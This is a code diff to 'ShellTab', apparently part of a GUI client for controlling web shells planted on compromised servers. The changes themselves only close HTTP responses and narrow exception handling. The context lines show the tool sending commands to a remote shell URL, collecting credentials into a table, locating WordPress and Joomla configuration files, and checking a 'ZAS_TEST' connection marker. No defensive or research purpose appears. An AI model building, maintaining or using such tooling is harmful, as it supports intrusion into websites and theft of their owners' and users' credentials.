@@ -231,6 +231,7 @@ class ShellTab:
                     req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                     resp = urllib.request.urlopen(req, timeout=15)
                     output = resp.read().decode("utf-8", errors="replace").strip()
+                    resp.close()
                     
                     self.frame.after(0, lambda: self._cmd_output(output))
                 except Exception as e:
@@ -266,6 +267,7 @@ class ShellTab:
                 req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                 resp = urllib.request.urlopen(req, timeout=15)
                 output = resp.read().decode("utf-8", errors="replace").strip()
+                resp.close()
                 
                 self.frame.after(0, lambda: self._update_files(output))
             except Exception as e:
@@ -318,6 +320,7 @@ class ShellTab:
                     req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                     resp = urllib.request.urlopen(req, timeout=10)
                     output = resp.read().decode("utf-8", errors="replace").strip()
+                    resp.close()
                     
                     if output and "error" not in output.lower()[:20]:
                         for line in output.split("\n")[:5]:
@@ -326,7 +329,7 @@ class ShellTab:
                                 if len(parts) >= 2:
                                     self.frame.after(0, lambda s=source, t=parts[0], v=parts[1]: 
                                         self.creds_tree.insert("", "end", values=(s, t, v)))
-                except:
+                except Exception:
                     pass
         
         threading.Thread(target=run, daemon=True).start()
@@ -360,6 +363,7 @@ class ShellTab:
                     req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                     resp = urllib.request.urlopen(req, timeout=10)
                     output = resp.read().decode("utf-8", errors="replace").strip()
+                    resp.close()
                     
                     if output:
                         for line in output.split("\n")[:10]:
@@ -368,7 +372,7 @@ class ShellTab:
                                 cms = "WordPress" if "wp-config" in cmd else "Joomla" if "configuration.php" in cmd else "Unknown"
                                 self.frame.after(0, lambda p=line, c=cms: 
                                     self.sites_tree.insert("", "end", values=(p, c, "")))
-                except:
+                except Exception:
                     pass
         
         threading.Thread(target=run, daemon=True).start()
@@ -391,6 +395,7 @@ class ShellTab:
                 req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                 resp = urllib.request.urlopen(req, timeout=10)
                 output = resp.read().decode("utf-8", errors="replace").strip()
+                resp.close()
                 
                 if "ZAS_TEST" in output:
                     self.frame.after(0, lambda: self._log_console("[+] Connection verified"))
